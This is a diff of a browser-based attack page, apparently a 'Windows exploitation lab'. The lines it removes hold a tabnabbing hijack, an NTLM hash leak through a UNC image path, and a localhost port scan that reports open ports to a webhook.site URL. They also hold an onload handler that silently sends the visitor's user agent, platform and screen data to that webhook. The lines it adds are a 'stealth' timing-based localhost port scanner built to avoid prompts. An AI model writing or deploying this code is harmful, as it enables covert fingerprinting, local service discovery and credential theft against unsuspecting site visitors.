@@ -1,123 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Windows Browser Exploitation Lab</title>
-    <style>
-        :root { --green: #00ff41; --bg: #0d0208; --card: #151515; }
-        body { background: var(--bg); color: var(--green); font-family: 'Consolas', monospace; padding: 20px; line-height: 1.6; }
-        .container { max-width: 800px; margin: auto; }
-        .card { background: var(--card); border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        h2 { border-bottom: 2px solid var(--green); padding-bottom: 10px; text-transform: uppercase; font-size: 1.2rem; }
-        button { background: transparent; color: var(--green); border: 1px solid var(--green); padding: 12px; width: 100%; margin: 8px 0; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: var(--green); color: #000; }
-        .log { background: #000; height: 250px; overflow-y: auto; border: 1px dashed #444; padding: 15px; font-size: 12px; color: #00ffff; border-radius: 4px; }
-        .warning { color: #ff3e3e; font-size: 0.8rem; margin-top: 5px; }
-        input { background: #222; border: 1px solid #444; color: #fff; padding: 8px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="card">
-        <h2>1. Tabnabbing (Parent Hijack)</h2>
-        <p>Yeh naya tab kholega aur 3 second baad is asli page ko redirect kar dega.</p>
-        <button onclick="testTabnabbing()">Launch Hijack Attack</button>
-    </div>
-
-    <div class="card">
-        <h2>2. Windows Discovery & Auth Leak</h2>
-        <p>SMB Hash leak aur local running apps (Discord/Steam) ka pata lagayein.</p>
-        <button onclick="triggerSMB()">Test SMB NTLM Leak</button>
-        <button onclick="scanLocalPorts()">Scan Localhost Ports</button>
-    </div>
-
-    <div class="card">
-        <h2>3. Protocol Fuzzing</h2>
-        <p>Check karein kaunse protocols bina user permission (prompt) ke khulte hain.</p>
-        <button onclick="triggerProtocol('ms-get-started:')">Launch 'Get Started'</button>
-        <button onclick="triggerProtocol('ms-windows-store:')">Launch Windows Store</button>
-        <button onclick="triggerProtocol('calculator:')">Launch Calculator</button>
-    </div>
-
-    <div class="card">
-        <h2>System Console</h2>
-        <div id="console" class="log">Initializing Windows Research Environment... Ready.</div>
-    </div>
+<div class="card">
+    <h2>Stealth Port Scanner (No-Prompt)</h2>
+    <button onclick="stealthScan()">Run Stealth Scan</button>
+    <div id="results" style="color: yellow; margin-top: 10px;"></div>
 </div>
 
 <script>
-    const consoleBox = document.getElementById('console');
-    const WEBHOOK_URL = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d";
-
-    function log(m, type = 'info') {
-        const time = new Date().toLocaleTimeString();
-        const color = type === 'success' ? '#00ff41' : (type === 'error' ? '#ff3e3e' : '#00ffff');
-        consoleBox.innerHTML += `<div style="color:${color}">> [${time}] ${m}</div>`;
-        consoleBox.scrollTop = consoleBox.scrollHeight;
-    }
-
-    // 1. Tabnabbing Logic (Jo aapke PC pe kaam kar raha tha)
-    function testTabnabbing() {
-        log("Opening child tab...");
-        let child = window.open("", "_blank");
-        child.document.write(`
-            <html><body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px;">
-            <h1>Child Tab Active</h1>
-            <p>Parent tab will be hijacked in 3 seconds...</p>
-            <script>
-                setTimeout(() => {
-                    if (window.opener) {
-                        window.opener.location = "https://example.com/?nabbed=true";
-                    }
-                }, 3000);
-            <\/script>
-            </body></html>
-        `);
-    }
-
-    // 2. SMB NTLM Leak Pattern
-    function triggerSMB() {
-        log("Attempting NTLM Hash Leak via UNC Path...", 'info');
-        // Browser is forced to resolve a local network path
-        let i = new Image();
-        i.src = "\\\\127.0.0.1\\c$\\Windows\\win.ini";
-        log("UNC Path triggered. Check if browser asked for network credentials.", 'success');
-    }
-
-    // 3. Port Scanning (Local App Discovery)
-    function scanLocalPorts() {
-        const ports = [6463, 3000, 8080, 5000]; // Discord, Dev servers, etc.
-        log("Scanning 127.0.0.1 for active software...", 'info');
+function stealthScan() {
+    const ports = [6463, 3000, 8080, 5000]; // Discord, etc.
+    const results = document.getElementById('results');
+    
+    ports.forEach(port => {
+        const start = performance.now();
+        // Image tag fetch alerts ko trigger nahi karta aksar
+        const img = new Image();
         
-        ports.forEach(port => {
-            fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors' })
-            .then(() => {
-                log(`ACTIVE SERVICE DETECTED: Port ${port}`, 'success');
-                fetch(`${WEBHOOK_URL}?port_found=${port}`);
-            })
-            .catch(() => {});
-        });
-    }
-
-    // 4. Protocol Launching
-    function triggerProtocol(uri) {
-        log(`Triggering protocol: ${uri}`);
-        window.location.href = uri;
-        log("Check for Windows system prompt.", 'info');
-    }
-
-    // Exfiltrate basic Windows info on load
-    window.onload = () => {
-        const data = {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${window.screen.width}x${window.screen.height}`
+        img.onload = img.onerror = () => {
+            const end = performance.now();
+            const duration = end - start;
+            // Agar port open hai, toh response fast (ya specific error) aayega
+            if (duration < 100) { 
+                results.innerHTML += `<br>Port ${port} is likely ACTIVE (Time: ${duration.toFixed(2)}ms)`;
+            }
         };
-        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-    };
-
+        
+        img.src = `http://127.0.0.1:${port}/favicon.ico?t=${start}`;
+    });
+}
 </script>
-</body>
-</html>
